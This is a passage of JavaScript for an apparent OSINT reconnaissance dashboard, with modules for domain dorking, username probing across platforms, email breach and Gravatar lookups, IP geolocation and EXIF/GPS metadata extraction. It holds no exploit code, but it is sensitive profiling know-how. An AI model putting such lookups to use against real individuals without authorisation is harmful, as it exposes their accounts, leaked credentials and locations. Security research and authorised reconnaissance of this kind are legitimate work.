    var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
    var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
    var lWordArray = Array(lNumberOfWords);
    var lBytePosition = 0;
    var lByteCount = 0;
    while (lByteCount < lMessageLength) {
      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
      lBytePosition = (lByteCount % 4) * 8;
      lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) << lBytePosition));
      lByteCount++;
    }
    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
    lBytePosition = (lByteCount % 4) * 8;
    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
    return lWordArray;
  }
  function WordToHex(lValue) {
    var WordToHexValue="",WordToHexValue_temp="",lByte,lCount;
    for (lCount = 0;lCount<=3;lCount++) {
      lByte = (lValue>>>(lCount*8)) & 255;
      WordToHexValue_temp = "0" + lByte.toString(16);
      WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length-2,2);
    }
    return WordToHexValue;
  }
  function Utf8Encode(string) {
    string = string.replace(/\r\n/g,"\n");
    var utftext = "";
    for (var n = 0; n < string.length; n++) {
      var c = string.charCodeAt(n);
      if (c < 128) {
        utftext += String.fromCharCode(c);
      } else if((c > 127) && (c < 2048)) {
        utftext += String.fromCharCode((c >> 6) | 192);
        utftext += String.fromCharCode((c & 63) | 128);
      } else {
        utftext += String.fromCharCode((c >> 12) | 224);
        utftext += String.fromCharCode(((c >> 6) & 63) | 128);
        utftext += String.fromCharCode((c & 63) | 128);
      }
    }
    return utftext;
  }
  var x=Array();
  var k,AA,BB,CC,DD,a,b,c,d;
  var S11=7, S12=12, S13=17, S14=22;
  var S21=5, S22=9 , S23=14, S24=20;
  var S31=4, S32=11, S33=16, S34=23;
  var S41=6, S42=10, S43=15, S44=21;
  string = Utf8Encode(string);
  x = ConvertToWordArray(string);
  a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;
  for (k=0;k<x.length;k+=16) {
    AA=a; BB=b; CC=c; DD=d;
    a=II(a,b,c,d,x[k+0],S11,0xD76AA478); d=II(d,a,b,c,x[k+1],S12,0xE8C7B756); c=II(c,d,a,b,x[k+2],S13,0x242070DB); b=II(b,c,d,a,x[k+3],S14,0xC1BDCEEE);
    a=II(a,b,c,d,x[k+4],S11,0xF57C0FAF); d=II(d,a,b,c,x[k+5],S12,0x4787C62A); c=II(c,d,a,b,x[k+6],S13,0xA8304613); b=II(b,c,d,a,x[k+7],S14,0xFD469501);
    a=II(a,b,c,d,x[k+8],S11,0x698098D8); d=II(d,a,b,c,x[k+9],S12,0x8B44F7AF); c=II(c,d,a,b,x[k+10],S13,0xFFFF5BB1); b=II(b,c,d,a,x[k+11],S14,0x895CD7BE);
    a=II(a,b,c,d,x[k+12],S11,0x6B901122); d=II(d,a,b,c,x[k+13],S12,0xFD987193); c=II(c,d,a,b,x[k+14],S13,0xA679438E); b=II(b,c,d,a,x[k+15],S14,0x49B40821);
    a=GG(a,b,c,d,x[k+1],S21,0xF61E2562); d=GG(d,a,b,c,x[k+6],S22,0xC040B340); c=GG(c,d,a,b,x[k+11],S23,0x265E5A51); b=GG(b,c,d,a,x[k+0],S24,0xE9B6C7AA);
    a=GG(a,b,c,d,x[k+5],S21,0xD62F105D); d=GG(d,a,b,c,x[k+10],S22,0x02441453); c=GG(c,d,a,b,x[k+15],S23,0xD8A1E681); b=GG(b,c,d,a,x[k+4],S24,0xE7D3FBC8);
    a=GG(a,b,c,d,x[k+9],S21,0x21E1CDE6); d=GG(d,a,b,c,x[k+14],S22,0xC33707D6); c=GG(c,d,a,b,x[k+3],S23,0xF4D50D87); b=GG(b,c,d,a,x[k+8],S24,0x455A14ED);
    a=GG(a,b,c,d,x[k+13],S21,0xA9E3E905); d=GG(d,a,b,c,x[k+2],S22,0xFCEFA3F8); c=GG(c,d,a,b,x[k+7],S23,0x676F02D9); b=GG(b,c,d,a,x[k+12],S24,0x8D2A4C8A);
    a=HH(a,b,c,d,x[k+5],S31,0xFFFA3942); d=HH(d,a,b,c,x[k+8],S32,0x8771F681); c=HH(c,d,a,b,x[k+11],S33,0x6D9D6122); b=HH(b,c,d,a,x[k+14],S34,0xFDE5380C);
    a=HH(a,b,c,d,x[k+1],S31,0xA4BEEA44); d=HH(d,a,b,c,x[k+4],S32,0x4BDECFA9); c=HH(c,d,a,b,x[k+7],S33,0xF6BB4B60); b=HH(b,c,d,a,x[k+10],S34,0xBEBFBC70);
    a=HH(a,b,c,d,x[k+13],S31,0x289B7EC6); d=HH(d,a,b,c,x[k+0],S32,0xEAA127FA); c=HH(c,d,a,b,x[k+3],S33,0xD4EF3085); b=HH(b,c,d,a,x[k+6],S34,0x04881D05);
    a=HH(a,b,c,d,x[k+9],S31,0xD9D4D039); d=HH(d,a,b,c,x[k+12],S32,0xE6DB99E5); c=HH(c,d,a,b,x[k+15],S33,0x1FA27CF8); b=HH(b,c,d,a,x[k+2],S34,0xC4AC5665);
    a=II2(a,b,c,d,x[k+0],S41,0xF4292244); d=II2(d,a,b,c,x[k+7],S42,0x432AFF97); c=II2(c,d,a,b,x[k+14],S43,0xAB9423A7); b=II2(b,c,d,a,x[k+5],S44,0xFC93A039);
    a=II2(a,b,c,d,x[k+12],S41,0x655B59C3); d=II2(d,a,b,c,x[k+3],S42,0x8F0CCC92); c=II2(c,d,a,b,x[k+10],S43,0xFFEFF47D); b=II2(b,c,d,a,x[k+1],S44,0x85845DD1);
    a=II2(a,b,c,d,x[k+8],S41,0x6FA87E4F); d=II2(d,a,b,c,x[k+15],S42,0xFE2CE6E0); c=II2(c,d,a,b,x[k+6],S43,0xA3014314); b=II2(b,c,d,a,x[k+13],S44,0x4E0811A1);
    a=II2(a,b,c,d,x[k+4],S41,0xF7537E82); d=II2(d,a,b,c,x[k+11],S42,0xBD3AF235); c=II2(c,d,a,b,x[k+2],S43,0x2AD7D2BB); b=II2(b,c,d,a,x[k+9],S44,0xEB86D391);
    a=AddUnsigned(a,AA); b=AddUnsigned(b,BB); c=AddUnsigned(c,CC); d=AddUnsigned(d,DD);
  }
  var temp = WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);
  return temp.toLowerCase();
}

// Global OSINT Controller
window.switchOsintModule = function(modName, btn) {
  window.osintActiveModule = modName;
  document.querySelectorAll('#osint-module-tabs .tools-cat-pill').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  
  // Toggle visible sections
  document.querySelectorAll('.osint-module-section').forEach(s => s.style.display = 'none');
  const activeSec = document.getElementById('osint-sec-' + modName);
  if (activeSec) activeSec.style.display = 'block';
  
  renderOsintDorks();
};

window.renderOsintDorks = function() {
  const mod = window.osintActiveModule || 'domain';
  if (mod === 'domain') {
    renderDomainOsint();
  } else if (mod === 'username') {
    renderUsernameSec();
  } else if (mod === 'email') {
    renderEmailSec();
  } else if (mod === 'ip') {
    renderIpSec();
  } else if (mod === 'exif') {
    renderExifSec();
  } else if (mod === 'cli') {
    renderCliSec();
  }
};

// 1. Domain OSINT Sub-renderer
window.updateOsintDomain = function() {
  const inp = document.getElementById('osint-target');
  if (inp) {
    window.osintTargetDomain = inp.value.trim();
    renderDomainOsint();
  }
};

window.switchOsintTab = function(tabName, btn) {
  window.osintActiveTab = tabName;
  document.querySelectorAll('#osint-tabs .tools-cat-pill').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  renderDomainOsint();
};

window.setOsintTargetFromActive = function() {
  if (S.targets && S.targets.length > 0) {
    const target = S.targets[0];
    const host = target.host || target.name || '';
    const cleanHost = host.replace(/^https?:\/\//i, '').split('/')[0];
    const inp = document.getElementById('osint-target');
    if (inp) {
      inp.value = cleanHost;
      window.osintTargetDomain = cleanHost;
      renderOsintDorks();
      toast(`Domain set to "${cleanHost}"`, 'success');
    }
  } else {
    toast('No targets found in workspace', 'error');
  }
};

window.executeOsintLookup = function(queryStr, directUrl) {
  const domain = window.osintTargetDomain;
  if (!domain) {
    toast('Please enter a target domain first!', 'error');
    const inp = document.getElementById('osint-target');
    if (inp) inp.focus();
    return;
  }
  
  let targetUrl = '';
  if (directUrl) {
    targetUrl = directUrl.replace(/\{\{domain\}\}/g, encodeURIComponent(domain));
  } else if (queryStr) {
    const q = queryStr.replace(/\{\{domain\}\}/g, domain);
    targetUrl = 'https://www.google.com/search?q=' + encodeURIComponent(q);
  }
  
  if (targetUrl) {
    window.open(targetUrl, '_blank');
  }
};

function renderDomainOsint() {
  const container = document.getElementById('osint-dork-list');
  if (!container) return;
  
  const activeTab = window.osintActiveTab || 'google';
  const items = osintItems[activeTab] || [];
  const domain = window.osintTargetDomain || 'example.com';
  
  container.innerHTML = items.map(item => {
    let displayQuery = '';
    if (item.query) {
      displayQuery = item.query.replace(/\{\{domain\}\}/g, domain);
    }
    
    return '<div class="osint-dork-card" onclick="executeOsintLookup(\'' + (item.query ? esc(item.query).replace(/'/g, "\\'") : '') + '\', \'' + (item.directUrl ? esc(item.directUrl).replace(/'/g, "\\'") : '') + '\')">' +
      '<div class="osint-card-title">' + esc(item.name) + '</div>' +
      '<div class="osint-card-desc">' + esc(item.desc) + '</div>' +
      (displayQuery ? '<div class="osint-card-query"><code>' + esc(displayQuery) + '</code></div>' : '') +
      '<div style="margin-top: 10px; display: flex; justify-content: flex-end;">' +
        '<span class="btn btn-sm btn-primary" style="font-size: 11px; padding: 3px 8px;">Run Lookup ⚡</span>' +
      '</div>' +
    '</div>';
  }).join('');
}

// 2. Username OSINT Sub-renderer
window.updateOsintUsername = function() {
  const inp = document.getElementById('osint-username-input');
  if (inp) {
    window.osintTargetUsername = inp.value.trim();
  }
};

function renderUsernameSec() {
  const grid = document.getElementById('username-results-grid');
  if (!grid) return;
  const username = window.osintTargetUsername || '';
  
  grid.innerHTML = usernamePlatforms.map(p => {
    const status = window.usernameCheckResults[p.name] || 'unchecked';
    const profileUrl = p.url.replace(/\{\{username\}\}/g, username || 'username');
    
    let badgeHtml = '';
    let cardClass = 'username-card';
    if (status === 'checking') {
      badgeHtml = '<span class="username-badge checking">Scanning...</span>';
      cardClass += ' status-checking';
    } else if (status === 'found') {
      badgeHtml = '<span class="username-badge found">FOUND</span>';
      cardClass += ' status-found';
    } else if (status === 'notfound') {
      badgeHtml = '<span class="username-badge notfound">NOT FOUND</span>';
      cardClass += ' status-notfound';
    } else if (status === 'manual') {
      badgeHtml = '<span class="username-badge checking" style="color:#eab308; background:rgba(234,179,8,0.1)">Verify Link</span>';
    } else {
      badgeHtml = '<span class="username-badge notfound">Unchecked</span>';
    }
    
    return `<div class="${cardClass}">
      <div style="display:flex; align-items:center; gap:8px; min-width:0; flex:1; margin-right:8px;">
        <span style="font-size:18px; flex-shrink:0;">${p.icon}</span>
        <div style="min-width:0; flex:1;">
          <div style="font-weight:700; color:#fff; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${p.name}</div>
          <a href="${profileUrl}" target="_blank" style="font-size:11px; color:var(--accent); text-decoration:none; display:block; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${username || 'Enter target'}</a>
        </div>
      </div>
      <div style="flex-shrink:0;">
        ${badgeHtml}
      </div>
    </div>`;
  }).join('');
}

window.checkAllUsernames = async function() {
  const username = window.osintTargetUsername;
  if (!username) {
    toast('Please enter a username first!', 'error');
    return;
  }
  
  const progressContainer = document.getElementById('username-scan-status');
  const progressBar = document.getElementById('username-scan-progress-bar');
  const progressLabel = document.getElementById('username-scan-progress-label');
  const progressStats = document.getElementById('username-scan-stats');
  const consoleLog = document.getElementById('username-scan-log');
  
  if (progressContainer) progressContainer.style.display = 'block';
  if (progressBar) progressBar.style.width = '0%';
  if (progressLabel) progressLabel.innerText = 'Scanning: 0%';
  if (progressStats) progressStats.innerText = `0/${usernamePlatforms.length} verified`;
  if (consoleLog) {
    consoleLog.innerHTML = `[i] Initializing OSINT username check for "${esc(username)}"
[i] Loading ${usernamePlatforms.length} platform signatures...
`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
  }
  
  // Set all to checking state
  usernamePlatforms.forEach(p => {
    window.usernameCheckResults[p.name] = 'checking';
  });
  renderUsernameSec();
  
  let checkedCount = 0;
  let foundCount = 0;
  
  // Probe sequential loops to avoid thread locking on client
  for (let i = 0; i < usernamePlatforms.length; i++) {
    const p = usernamePlatforms[i];
    if (consoleLog) {
      consoleLog.innerHTML += `[~] Probing ${esc(p.name)}... \n`;
      consoleLog.scrollTop = consoleLog.scrollHeight;
    }
    
    try {
      const res = await fetch('/api/osint/username-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, platform: p.name })
      });
      const data = await res.json();
      
      const status = data.status || 'manual';
      window.usernameCheckResults[p.name] = status;
      
      if (status === 'found') {
        foundCount++;
        if (consoleLog) {
          consoleLog.innerHTML += `<span style="color:#10b981;">[+] FOUND matches on ${esc(p.name)}: ${esc(data.url)}</span>\n`;
        }
      } else if (status === 'notfound') {
        if (consoleLog) {
          consoleLog.innerHTML += `[-] No user found on ${esc(p.name)}\n`;
        }
      } else {
        if (consoleLog) {
          consoleLog.innerHTML += `<span style="color:#eab308;">[!] Manual review needed for ${esc(p.name)} (${esc(data.message || 'CORS/API protected')})</span>\n`;
        }
      }
    } catch (err) {
      window.usernameCheckResults[p.name] = 'manual';
      if (consoleLog) {
        consoleLog.innerHTML += `<span style="color:#ef4444;">[!] Error probing ${esc(p.name)}: ${esc(err.message)}</span>\n`;
      }
    }
    
    checkedCount++;
    const percent = Math.round((checkedCount / usernamePlatforms.length) * 100);
    
    if (progressBar) progressBar.style.width = `${percent}%`;
    if (progressLabel) progressLabel.innerText = `Scanning: ${percent}%`;
    if (progressStats) progressStats.innerText = `${checkedCount}/${usernamePlatforms.length} verified`;
    if (consoleLog) consoleLog.scrollTop = consoleLog.scrollHeight;
    
    renderUsernameSec();
  }
  
  if (consoleLog) {
    consoleLog.innerHTML += `\n[x] SCAN COMPLETE: Found ${foundCount} registered social profiles.\n`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
  }
  toast(`Scan complete! Found ${foundCount} profiles.`, 'success');
};

window.openAllUsernames = function() {
  const username = window.osintTargetUsername;
  if (!username) {
    toast('Please enter a username first!', 'error');
    return;
  }
  usernamePlatforms.forEach(p => {
    if (p.name !== 'Google Search') {
      window.open(p.url.replace(/\{\{username\}\}/g, username), '_blank');
    }
  });
};

window.copyUsernameUrls = function() {
  const username = window.osintTargetUsername;
  if (!username) {
    toast('Please enter a username first!', 'error');
    return;
  }
  const urls = usernamePlatforms.map(p => p.url.replace(/\{\{username\}\}/g, username)).join('\n');
  navigator.clipboard.writeText(urls).then(() => {
    toast('Copied all profile URLs to clipboard!', 'success');
  });
};

// 3. Email OSINT Sub-renderer
window.updateOsintEmail = function() {
  const inp = document.getElementById('osint-email-input');
  if (inp) {
    window.osintTargetEmail = inp.value.trim();
  }
};

function renderEmailSec() {
  const email = window.osintTargetEmail || '';
  const breachGrid = document.getElementById('email-breach-grid');
  if (!breachGrid) return;
  
  const searchTemplates = [
    { name: 'Have I Been Pwned Search', url: 'https://haveibeenpwned.com/account/' + encodeURIComponent(email), desc: 'Check if this email is in known data breaches.' },
    { name: 'Firefox Monitor Check', url: 'https://monitor.firefox.com/', desc: 'Check if this email is in Firefox Monitor leaks database.' },
    { name: 'IntelX Leak Search', url: 'https://intelx.io/?s=' + encodeURIComponent(email), desc: 'Search compromised intelligence leak logs for the email address.' },
    { name: 'Epieos Google Account Check', url: 'https://epieos.com/?q=' + encodeURIComponent(email), desc: 'Identify linked Google Photos, maps review, calendars, and account ID.' },
    { name: 'Hunter.io Domain Verification', url: 'https://hunter.io/email-verifier/' + encodeURIComponent(email), desc: 'Verify email deliverability and SMTP records.' },
    { name: 'Dehashed Database Search', url: 'https://www.dehashed.com/search?query=' + encodeURIComponent('"' + email + '"'), desc: 'Search compromised databases for decrypted hashes & passwords.' },
    { name: 'MIT PGP Public Keys Lookup', url: 'https://pgp.mit.edu/pks/lookup?search=' + encodeURIComponent(email) + '&op=index', desc: 'Find keys linked to this email exposing names and key dates.' },
    { name: 'OpenPGP Key Server Search', url: 'https://keys.openpgp.org/search?q=' + encodeURIComponent(email), desc: 'Look up email verified cryptographic identity keys.' }
  ];
  
  breachGrid.innerHTML = searchTemplates.map(t => {
    return `<div class="osint-dork-card" onclick="window.open('${t.url}', '_blank')" style="margin-bottom:0; padding:10px 14px;">
      <div style="display:flex; justify-content:space-between; align-items:center;">
        <div style="font-weight:700; color:#fff;">${t.name}</div>
        <span class="btn btn-sm" style="font-size:10px; padding:2px 6px;">Query ⚡</span>
      </div>
      <div class="osint-card-desc" style="margin-bottom:0; margin-top:4px;">${t.desc}</div>
    </div>`;
  }).join('');
}

window.lookupEmailProfiles = function() {
  const email = window.osintTargetEmail;
  if (!email) {
    toast('Please enter an email address first!', 'error');
    return;
  }
  
  renderEmailSec();
  
  const gravatarContainer = document.getElementById('email-gravatar-result');
  if (!gravatarContainer) return;
  
  gravatarContainer.innerHTML = `<div style="text-align:center; padding:20px;"><div class="pulse-dot" style="display:inline-block;"></div><div style="color:var(--text3); font-size:12px; margin-top:8px;">Querying Gravatar APIs...</div></div>`;
  
  const emailHash = md5(email.trim().toLowerCase());
  const url = `https://en.gravatar.com/${emailHash}.json`;
  
  fetch(url)
    .then(res => {
      if (res.status === 200) {
        return res.json();
      } else {
        throw new Error('Profile not found');
      }
    })
    .then(data => {
      const entry = data.entry && data.entry[0];
      if (!entry) {
        gravatarContainer.innerHTML = `<div class="empty-state" style="padding:16px 0;"><div class="es-sub">Gravatar profile not found for this email hash.</div></div>`;
        return;
      }
      
      const avatarUrl = entry.thumbnailUrl || `https://www.gravatar.com/avatar/${emailHash}?s=200`;
      const name = entry.displayName || entry.preferredUsername || 'Unnamed User';
      const about = entry.aboutMe || 'No bio provided.';
      const loc = entry.currentLocation || 'Unknown Location';
      
      let accountsHtml = '';
      if (entry.accounts && entry.accounts.length > 0) {
        accountsHtml = `<div style="margin-top:12px;">
          <div style="font-size:11px; font-weight:700; color:var(--text3); text-transform:uppercase;">Connected Accounts</div>
          <div style="display:flex; gap:6px; flex-wrap:wrap; margin-top:6px;">
            ${entry.accounts.map(acc => `<a href="${acc.url}" target="_blank" class="btn btn-sm" style="font-size:10px; padding:2px 6px;">${acc.shortname}</a>`).join('')}
          </div>
        </div>`;
      }
      
      gravatarContainer.innerHTML = `
        <div style="display:flex; gap:16px; align-items:flex-start;">
          <img src="${avatarUrl}" style="width:70px; height:70px; border-radius:50%; border:2px solid var(--accent); box-shadow:0 0 10px rgba(139,92,246,0.2);" />
          <div style="flex:1;">
            <div style="font-size:16px; font-weight:700; color:#fff;">${esc(name)}</div>
            <div style="font-size:11px; color:var(--text3); margin-top:2px;">📍 ${esc(loc)}</div>
            <div style="font-size:12.5px; color:var(--text2); margin-top:8px; line-height:1.4;">${esc(about)}</div>
            ${accountsHtml}
          </div>
        </div>
      `;
    })
    .catch(err => {
      gravatarContainer.innerHTML = `<div class="empty-state" style="padding:16px 0;"><div class="es-sub">No Gravatar profile associated with this email.</div></div>`;
    })
    .finally(() => {
      // Perform an active MX check for the email's domain
      const domain = email.split('@')[1];
      if (!domain) return;
      
      const mxContainer = document.createElement('div');
      mxContainer.style.marginTop = '20px';
      mxContainer.style.borderTop = '1px solid var(--border)';
      mxContainer.style.paddingTop = '12px';
      mxContainer.innerHTML = `<div style="font-size:11px; font-weight:700; color:var(--text3); text-transform:uppercase;">Mail Server (MX) Records Check</div>
                               <div style="font-size:12px; color:var(--text2); margin-top:6px;"><div class="pulse-dot" style="display:inline-block; width:6px; height:6px;"></div> Checking MX records for ${esc(domain)}...</div>`;
      gravatarContainer.appendChild(mxContainer);
      
      fetch('/api/osint/dns', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ domain })
      })
      .then(res => res.json())
      .then(data => {
        const mxRecords = data.records && data.records.MX;
        if (mxRecords && mxRecords.length > 0 && !mxRecords[0].error) {
          let mxList = mxRecords.map(r => `<code>${esc(r.data)}</code> (TTL: ${r.TTL})`).join(', ');
          mxContainer.innerHTML = `<div style="font-size:11px; font-weight:700; color:var(--text3); text-transform:uppercase;">Mail Server (MX) Records Check</div>
                                   <div style="font-size:12.5px; color:#22c55e; margin-top:6px; font-weight:600;">🟢 MX Records Found:</div>
                                   <div style="font-size:11px; color:var(--text2); margin-top:4px; font-family:var(--mono); line-height:1.4;">${mxList}</div>`;
        } else {
          mxContainer.innerHTML = `<div style="font-size:11px; font-weight:700; color:var(--text3); text-transform:uppercase;">Mail Server (MX) Records Check</div>
                                   <div style="font-size:12.5px; color:var(--red); margin-top:6px; font-weight:600;">🔴 No MX Records Found!</div>
                                   <div style="font-size:11px; color:var(--text3); margin-top:4px;">Domain has no mail servers configured. Emails cannot be received and are likely spoofable or fake.</div>`;
        }
      })
      .catch(err => {
        mxContainer.innerHTML = `<div style="font-size:11px; font-weight:700; color:var(--text3); text-transform:uppercase;">Mail Server (MX) Records Check</div>
                                 <div style="font-size:12px; color:var(--text3); margin-top:6px;">⚠️ Failed to perform MX lookup: ${esc(err.message)}</div>`;
      });
    });
};

// 4. IP & Network OSINT Sub-renderer
window.updateOsintIP = function() {
  const inp = document.getElementById('osint-ip-input');
  if (inp) {
    window.osintTargetIP = inp.value.trim();
  }
};

function renderIpSec() {
  const ip = window.osintTargetIP || '';
  const portalGrid = document.getElementById('ip-portals-grid');
  if (!portalGrid) return;
  
  const portals = [
    { name: 'Shodan IP Search', url: 'https://www.shodan.io/host/' + encodeURIComponent(ip) },
    { name: 'Censys Host Search', url: 'https://search.censys.io/hosts/' + encodeURIComponent(ip) },
    { name: 'HE BGP Route Toolkit', url: 'https://bgp.he.net/ip/' + encodeURIComponent(ip) },
    { name: 'AbuseIPDB Lookup', url: 'https://www.abuseipdb.com/check/' + encodeURIComponent(ip) },
    { name: 'VirusTotal IP Scan', url: 'https://www.virustotal.com/gui/ip-address/' + encodeURIComponent(ip) },
    { name: 'AlienVault OTX Details', url: 'https://otx.alienvault.com/indicator/ip/' + encodeURIComponent(ip) }
  ];
  
  portalGrid.innerHTML = portals.map(p => {
    return `<button class="btn btn-sm" onclick="window.open('${p.url}', '_blank')" style="background:var(--bg2); border:1px solid var(--border); text-align:left; font-size:12px; font-weight:600; padding:10px 12px; display:flex; justify-content:space-between; align-items:center; margin-bottom:0;">
      <span>${p.name}</span>
      <span style="font-size:10px; opacity:0.6;">⚡</span>
    </button>`;
  }).join('');
}

window.lookupIpDetails = function() {
  const ip = window.osintTargetIP;
  if (!ip) {
    toast('Please enter an IP address first!', 'error');
    return;
  }
  
  renderIpSec();
  
  const geoResult = document.getElementById('ip-geolocation-result');
  if (!geoResult) return;
  
  geoResult.innerHTML = `<div style="text-align:center; padding:20px;"><div class="pulse-dot" style="display:inline-block;"></div><div style="color:var(--text3); font-size:12px; margin-top:8px;">Fetching geolocation data...</div></div>`;
  
  fetch(`https://ipapi.co/${ip}/json/`)
    .then(res => res.json())
    .then(data => {
      if (data.error) {
        geoResult.innerHTML = `<div class="empty-state" style="padding:16px 0;"><div class="es-sub" style="color:var(--red);">${esc(data.reason || 'Failed to resolve IP')}</div></div>`;
        return;
      }
      
      const city = data.city || 'Unknown City';
      const region = data.region || 'Unknown Region';
      const country = data.country_name || 'Unknown Country';
      const countryCode = data.country_code || '';
      const org = data.org || 'Unknown Provider';
      const asn = data.asn || 'Unknown ASN';
      const lat = data.latitude;
      const lon = data.longitude;
      
      const mapLink = (lat && lon) ? `<a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn btn-sm btn-primary" style="margin-top:10px; font-size:11px; padding:3px 8px; display:inline-block; text-decoration:none;">🗺️ View in Google Maps</a>` : '';
      
      geoResult.innerHTML = `
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:12px; font-size:12.5px;">
          <div><strong style="color:var(--text3);">Target IP:</strong> <span style="font-family:var(--mono); color:#fff;">${esc(data.ip || ip)}</span></div>
          <div><strong style="color:var(--text3);">Country:</strong> <span style="color:#fff;">${esc(country)} (${esc(countryCode)})</span></div>
          <div><strong style="color:var(--text3);">Region / City:</strong> <span style="color:#fff;">${esc(region)}, ${esc(city)}</span></div>
          <div><strong style="color:var(--text3);">ISP / Org:</strong> <span style="color:#fff;">${esc(org)}</span></div>
          <div><strong style="color:var(--text3);">ASN:</strong> <span style="font-family:var(--mono); color:#fff;">${esc(asn)}</span></div>
          <div><strong style="color:var(--text3);">Coordinates:</strong> <span style="font-family:var(--mono); color:#fff;">${lat || 'N/A'}, ${lon || 'N/A'}</span></div>
        </div>
        ${mapLink}
      `;
    })
    .catch(err => {
      geoResult.innerHTML = `<div class="empty-state" style="padding:16px 0;"><div class="es-sub">Network error querying geolocation services.</div></div>`;
    });
};

// 5. File Metadata (EXIF) Sub-renderer
function renderExifSec() {
  const zone = document.getElementById('exif-dropzone');
  if (!zone) return;
  
  if (!zone.getAttribute('data-bound')) {
    zone.setAttribute('data-bound', 'true');
    
    zone.addEventListener('dragover', (e) => {
      e.preventDefault();
      zone.classList.add('dragover');
    });
    zone.addEventListener('dragleave', () => {
      zone.classList.remove('dragover');
    });
    zone.addEventListener('drop', (e) => {
      e.preventDefault();
      zone.classList.remove('dragover');
      const files = e.dataTransfer.files;
      if (files.length > 0) {
        processExifFile(files[0]);
      }
    });
  }
}

window.handleExifUpload = function(e) {
  const files = e.target.files;
  if (files.length > 0) {
    processExifFile(files[0]);
  }
};

function processExifFile(file) {
  const container = document.getElementById('exif-results-container');
  const tableBody = document.getElementById('exif-tags-table-body');
  const gpsDetails = document.getElementById('exif-gps-details');
  const previewImg = document.getElementById('exif-preview-img');
  const previewPlaceholder = document.getElementById('exif-preview-placeholder');
  const metaBadges = document.getElementById('exif-meta-badges');
  const asciiConsole = document.getElementById('exif-ascii-console');

  if (!container || !tableBody || !gpsDetails) return;
  
  container.style.display = 'block';
  tableBody.innerHTML = '';
  
  if (previewImg) {
    previewImg.style.display = 'none';
    previewImg.src = '';
  }
  if (previewPlaceholder) {
    previewPlaceholder.style.display = 'block';
  }
  if (metaBadges) {
    metaBadges.innerHTML = '';
  }
  if (asciiConsole) {
    asciiConsole.textContent = 'Scanning file structure...';
  }
  
  if (file.type.startsWith('image/')) {
    const objectUrl = URL.createObjectURL(file);
    if (previewImg) {
      previewImg.src = objectUrl;
      previewImg.style.display = 'block';
      previewImg.onload = () => {
        URL.revokeObjectURL(objectUrl);
      };
    }
    if (previewPlaceholder) {
      previewPlaceholder.style.display = 'none';
    }
  }

  const basicTags = [
    { name: 'File Name', val: file.name },
    { name: 'File Size', val: (file.size / 1024).toFixed(2) + ' KB' },
    { name: 'File Type', val: file.type || 'Unknown' },
    { name: 'Last Modified', val: new Date(file.lastModified).toLocaleString() }
  ];
  
  let rowsHtml = basicTags.map(t => `<tr><td style="color:var(--text3); font-weight:700; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05);">${t.name}</td><td style="font-family:var(--mono); color:#fff; padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05);">${esc(t.val)}</td></tr>`).join('');
  
  const reader = new FileReader();
  reader.onload = function(e) {
    const arrayBuffer = e.target.result;
    let tags = {};
    let formatType = 'Unknown';
    
    const view = new DataView(arrayBuffer);
    let isJpeg = false;
    let isPng = false;
    
    if (view.byteLength >= 2 && view.getUint16(0, false) === 0xFFD8) {
      isJpeg = true;
      formatType = 'JPEG';
    } else if (view.byteLength >= 8 && view.getUint32(0) === 0x89504E47 && view.getUint32(4) === 0x0D0A1A0A) {
      isPng = true;
      formatType = 'PNG';
    } else if (view.byteLength >= 4 && view.getUint32(0) === 0x52494646) {
      formatType = 'WebP/RIFF';
    }
    
    try {
      if (isJpeg) {
        tags = parseExif(arrayBuffer) || {};
      } else if (isPng) {
        tags = parsePngMetadata(arrayBuffer) || {};
      }
    } catch(ex) {
      console.error('Metadata parsing failed', ex);
    }
    
    let asciiMeta = [];
    try {
      const bytes = new Uint8Array(arrayBuffer);
      let str = '';
      for (let i = 0; i < Math.min(bytes.length, 50000); i++) {
        const c = bytes[i];
        if (c >= 32 && c <= 126) {
          str += String.fromCharCode(c);
        } else {
          if (str.length > 5 && (str.includes('Date') || str.includes('date') || str.includes('Software') || str.includes('software') || str.includes('Camera') || str.includes('Adobe') || str.includes('Creator') || str.includes('Author') || str.includes('Copyright'))) {
            asciiMeta.push(str.trim());
          }
          str = '';
        }
      }
    } catch(ex) {}
    
    let badgesHtml = `<span style="background: rgba(59,130,246,0.2); border: 1px solid rgba(59,130,246,0.4); color: #60a5fa; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 12px;">Format: ${formatType}</span>`;
    
    const parsedKeys = Object.keys(tags);
    if (parsedKeys.length > 0) {
      badgesHtml += `<span style="background: rgba(16,185,129,0.2); border: 1px solid rgba(16,185,129,0.4); color: #34d399; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 12px;">Metadata Extracted</span>`;
    } else {
      badgesHtml += `<span style="background: rgba(107,114,128,0.2); border: 1px solid rgba(107,114,128,0.4); color: #9ca3af; font-size: 11px; font-weight: 700; padding: 2px 8px; border-radius: 12px;">No Structure Headers</span>`;
    }
    
    for (const key in tags) {
      if (key !== 'GPSInfo' && tags[key]) {
